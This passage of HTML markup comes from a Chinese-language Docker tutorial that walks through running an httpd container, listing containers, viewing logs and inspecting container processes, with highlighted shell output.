class=\"crayon-num\" data-line=\"crayon-5b4d7a46bf37b651761197-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a46bf37b651761197-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a46bf37b651761197-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a46bf37b651761197-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a46bf37b651761197-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a46bf37b651761197-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a46bf37b651761197-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a46bf37b651761197-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a46bf37b651761197-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a46bf37b651761197-14\">14</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7a46bf37b651761197-1\"><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">kerneltalks</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># docker container run -d -p 80:80 httpd</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a46bf37b651761197-2\"><span class=\"crayon-e\">Unable </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">find </span><span class=\"crayon-i\">image</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'httpd:latest'</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">locally</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a46bf37b651761197-3\"><span class=\"crayon-v\">latest</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Pulling </span><span class=\"crayon-e\">from </span><span class=\"crayon-v\">library</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">httpd</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a46bf37b651761197-4\"><span class=\"crayon-cn\">3d77ce4481b1</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Pull </span><span class=\"crayon-i\">complete</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a46bf37b651761197-5\"><span class=\"crayon-cn\">73674f4d9403</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Pull </span><span class=\"crayon-e\">complete</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a46bf37b651761197-6\"><span class=\"crayon-v\">d266646f40bd</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Pull </span><span class=\"crayon-e\">complete</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a46bf37b651761197-7\"><span class=\"crayon-v\">ce7b0dda0c9f</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Pull </span><span class=\"crayon-i\">complete</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a46bf37b651761197-8\"><span class=\"crayon-cn\">01729050d692</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Pull </span><span class=\"crayon-i\">complete</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a46bf37b651761197-9\"><span class=\"crayon-cn\">014246127c67</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Pull </span><span class=\"crayon-i\">complete</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a46bf37b651761197-10\"><span class=\"crayon-cn\">7cd2e04cf570</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Pull </span><span class=\"crayon-e\">complete</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a46bf37b651761197-11\"><span class=\"crayon-v\">Digest</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sha256</span><span class=\"crayon-o\">:</span><span class=\"crayon-e\">f4610c3a1a7da35072870625733fd0384515f7e912c6223d4a48c6eb749a8617</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a46bf37b651761197-12\"><span class=\"crayon-v\">Status</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Downloaded </span><span class=\"crayon-e\">newer </span><span class=\"crayon-e\">image </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">httpd</span><span class=\"crayon-o\">:</span><span class=\"crayon-e\">latest</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a46bf37b651761197-13\"><span class=\"crayon-i\">c46f2e9e4690f5c28ee7ad508559ceee0160ac3e2b1688a61561ce9f7d99d682</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a46bf37b651761197-14\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0020 seconds] -->\r\n<p>Docker 的 <code>run</code> 命令将镜像名作为强制参数，另外还有很多可选参数。常用的参数有：</p>\n<ul>\n<li><code>-d</code>：从当前 shell 脱离容器</li>\n<li><code>-p X:Y</code>：绑定容器的端口 Y 到宿主机的端口 X</li>\n<li><code>--name</code>：命名你的容器。如果未指定，它将被赋予随机生成的名字</li>\n<li><code>-e</code>：当启动容器时传递环境编辑及其值</li>\n</ul>\n<p>通过以上输出你可以看到，我们将 <code>httpd</code> 作为镜像名来运行容器。接着，本地镜像没有找到，Docker 引擎从 Docker Hub 拉取了它。注意，它下载了镜像 <code>httpd:latest</code>， 其中 <code>:</code> 后面跟着版本号。如果你需要运行特定版本的容器，你可以在镜像名后面注明版本名。如果不提供版本名，Docker 引擎会自动拉取最新的版本。</p>\n<p>输出的最后一行显示了你新运行的 httpd 容器的唯一 ID。</p>\n<h3 id=\"toc_2\">如何列出所有运行中的 Docker 容器？</h3>\n<p>现在，你的容器已经运行起来了，你可能想要确认这一点，或者你想要列出你的机器上运行的所有容器。你可以使用 <code>docker container ls</code> 命令。在旧的 Docker 版本中，对应的命令为 <code>docker ps</code>。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a46bf385797504499\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nroot@kerneltalks # docker container ls\r\nCONTAINER ID        IMAGE               COMMAND              CREATED             STATUS              PORTS                NAMES\r\nc46f2e9e4690        httpd               \"httpd-foreground\"   11 minutes ago      Up 11 minutes       0.0.0.0:80-&gt;80/tcp   cranky_cori\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a46bf385797504499-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a46bf385797504499-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a46bf385797504499-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a46bf385797504499-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7a46bf385797504499-1\"><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">kerneltalks</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># docker container ls</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a46bf385797504499-2\"><span class=\"crayon-e\">CONTAINER </span><span class=\"crayon-e\">ID        </span><span class=\"crayon-e\">IMAGE               </span><span class=\"crayon-e\">COMMAND              </span><span class=\"crayon-e\">CREATED             </span><span class=\"crayon-e\">STATUS              </span><span class=\"crayon-e\">PORTS                </span><span class=\"crayon-e\">NAMES</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a46bf385797504499-3\"><span class=\"crayon-e\">c46f2e9e4690        </span><span class=\"crayon-i\">httpd</span><span class=\"crayon-h\">               </span><span class=\"crayon-s\">\"httpd-foreground\"</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">11</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">minutes </span><span class=\"crayon-e\">ago      </span><span class=\"crayon-i\">Up</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">11</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">minutes</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">0.0.0.0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">80</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-cn\">80</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">tcp   </span><span class=\"crayon-v\">cranky</span><span class=\"crayon-sy\">_</span>cori</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a46bf385797504499-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p>列出的结果是按列显示的。每一列的值分别为：</p>\n<ol>\n<li>Container ID ：一开始的几个字符对应你的容器的唯一 ID</li>\n<li>Image ：你运行容器的镜像名</li>\n<li>Command ：容器启动后运行的命令</li>\n<li>Created ：创建时间</li>\n<li>Status ：容器当前状态</li>\n<li>Ports ：与宿主端口相连接的端口信息</li>\n<li>Names ：容器名（如果你没有命名你的容器，那么会随机创建）</li>\n</ol>\n<h3 id=\"toc_3\">如何查看 Docker 容器的历史纪录？</h3>\n<p>在第一步我们使用了 <code>-d</code> 参数来将容器，在它一开始运行的时候，就从当前的 shell 中脱离出来。在这种情况下，我们不知道容器里面发生了什么。所以为了查看容器的历史纪录，Docker 提供了 <code>logs</code> 命令。它采用容器名称或 ID 作为参数。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a46bf38a987529658\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nroot@kerneltalks # docker container logs cranky_cori\r\nAH00558: httpd: Could not reliably determine the server's fully qualified domain name, using 172.17.0.2. Set the 'ServerName' directive globally to suppress this message\r\nAH00558: httpd: Could not reliably determine the server's fully qualified domain name, using 172.17.0.2. Set the 'ServerName' directive globally to suppress this message\r\n[Thu May 31 18:35:07.301158 2018] [mpm_event:notice] [pid 1:tid 139734285989760] AH00489: Apache/2.4.33 (Unix) configured -- resuming normal operations\r\n[Thu May 31 18:35:07.305153 2018] [core:notice] [pid 1:tid 139734285989760] AH00094: Command line: 'httpd -D FOREGROUND'\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a46bf38a987529658-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a46bf38a987529658-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a46bf38a987529658-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a46bf38a987529658-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a46bf38a987529658-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a46bf38a987529658-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7a46bf38a987529658-1\"><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">kerneltalks</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># docker container logs cranky_cori</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a46bf38a987529658-2\"><span class=\"crayon-v\">AH00558</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">httpd</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Could </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">reliably </span><span class=\"crayon-e\">determine </span><span class=\"crayon-e\">the </span><span class=\"crayon-i\">server</span><span class=\"crayon-s\">'s fully qualified domain name, using 172.17.0.2. Set the '</span><span class=\"crayon-i\">ServerName</span><span class=\"crayon-s\">' directive globally to suppress this message</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a46bf38a987529658-3\"><span class=\"crayon-s\">AH00558: httpd: Could not reliably determine the server'</span><span class=\"crayon-i\">s</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">fully </span><span class=\"crayon-e\">qualified </span><span class=\"crayon-e\">domain </span><span class=\"crayon-v\">name</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">using</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">172.17.0.2.</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Set </span><span class=\"crayon-i\">the</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'ServerName'</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">directive </span><span class=\"crayon-e\">globally </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">suppress </span><span class=\"crayon-r\">this</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">message</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a46bf38a987529658-4\"><span class=\"crayon-sy\">[</span><span class=\"crayon-e\">Thu </span><span class=\"crayon-i\">May</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">31</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">35</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">07.301158</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2018</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">mpm_event</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">notice</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-i\">pid</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">tid</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">139734285989760</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">AH00489</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Apache</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">2.4.33</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Unix</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">configured</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">resuming </span><span class=\"crayon-e\">normal </span><span class=\"crayon-i\">operations</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a46bf38a987529658-5\"><span class=\"crayon-sy\">[</span><span class=\"crayon-e\">Thu </span><span class=\"crayon-i\">May</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">31</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">35</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">07.305153</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2018</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">core</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">notice</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-i\">pid</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">tid</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">139734285989760</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">AH00094</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Command </span><span class=\"crayon-v\">line</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'httpd -D FOREGROUND'</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a46bf38a987529658-6\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0029 seconds] -->\r\n<p>这里我使用了容器名称作为参数。你可以看到在我们的 httpd 容器中与 Apache 相关的历史纪录。</p>\n<h3 id=\"toc_4\">如何确定 Docker 容器的进程？</h3>\n<p>容器是一个使用宿主资源来运行的进程。这样，你可以在宿主系统的进程表中定位容器的进程。让我们在宿主系统上确定容器进程。</p>\n<p>Docker 使用著名的 <code>top</code> 命令作为子命令的名称，来查看容器产生的进程。它采用容器的名称或 ID 作为参数。在旧版本的 Docker 中，只可运行 <code>docker top</code> 命令。在新版本中，<code>docker top</code> 和 <code>docker container top</code> 命令都可以生效。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a46bf38f927333707\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nroot@kerneltalks # docker container top  cranky_cori\r\nUID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD\r\nroot                15702               15690               0                   18:35               ?                   00:00:00            httpd -DFOREGROUND\r\nbin                 15729               15702               0                   18:35               ?                   00:00:00            httpd -DFOREGROUND\r\nbin                 15730               15702               0                   18:35               ?                   00:00:00            httpd -DFOREGROUND\r\nbin                 15731               15702               0                   18:35               ?                   00:00:00            httpd -DFOREGROUND\r\n\r\nroot@kerneltalks # ps -ef |grep -i 15702\r\nroot     15702 15690  0 18:35 ?        00:00:00 httpd -DFOREGROUND\r\nbin      15729 15702  0 18:35 ?        00:00:00 httpd -DFOREGROUND\r\nbin      15730 15702  0 18:35 ?        00:00:00 httpd -DFOREGROUND\r\nbin      15731 15702  0 18:35 ?        00:00:00 httpd -DFOREGROUND\r\nroot     15993 15957  0 18:59 pts/0    00:00:00 grep --color=auto -i 15702\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a46bf38f927333707-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a46bf38f927333707-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a46bf38f927333707-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a46bf38f927333707-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a46bf38f927333707-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a46bf38f927333707-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a46bf38f927333707-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a46bf38f927333707-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a46bf38f927333707-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a46bf38f927333707-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a46bf38f927333707-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a46bf38f927333707-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a46bf38f927333707-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a46bf38f927333707-14\">14</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7a46bf38f927333707-1\"><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">kerneltalks</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># docker container top  cranky_cori</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a46bf38f927333707-2\"><span class=\"crayon-e\">UID                 </span><span class=\"crayon-e\">PID                 </span><span class=\"crayon-i\">PPID</span><span class=\"crayon-h\">                </span><span class=\"crayon-i\">C</span><span class=\"crayon-h\">                   </span><span class=\"crayon-e\">STIME               </span><span class=\"crayon-e\">TTY                 </span><span class=\"crayon-e\">TIME                </span><span class=\"crayon-e\">CMD</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a46bf38f927333707-3\"><span class=\"crayon-i\">root</span><span class=\"crayon-h\">                </span><span class=\"crayon-cn\">15702</span><span class=\"crayon-h\">               </span><span class=\"crayon-cn\">15690</span><span class=\"crayon-h\">               </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">                   </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">35</span><span class=\"crayon-h\">               </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\">                   </span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\">            </span><span class=\"crayon-v\">httpd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">DFOREGROUND</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a46bf38f927333707-4\"><span class=\"crayon-i\">bin</span><span class=\"crayon-h\">                 </span><span class=\"crayon-cn\">15729</span><span class=\"crayon-h\">               </span><span class=\"crayon-cn\">15702</span><span class=\"crayon-h\">               </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">                   </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">35</span><span class=\"crayon-h\">               </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\">                   </span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\">            </span><span class=\"crayon-v\">httpd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">DFOREGROUND</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a46bf38f927333707-5\"><span class=\"crayon-i\">bin</span><span class=\"crayon-h\">                 </span><span class=\"crayon-cn\">15730</span><span class=\"crayon-h\">               </span><span class=\"crayon-cn\">15702</span><span class=\"crayon-h\">               </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">                   </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">35</span><span class=\"crayon-h\">               </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\">                   </span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\">            </span><span class=\"crayon-v\">httpd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">DFOREGROUND</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a46bf38f927333707-6\"><span 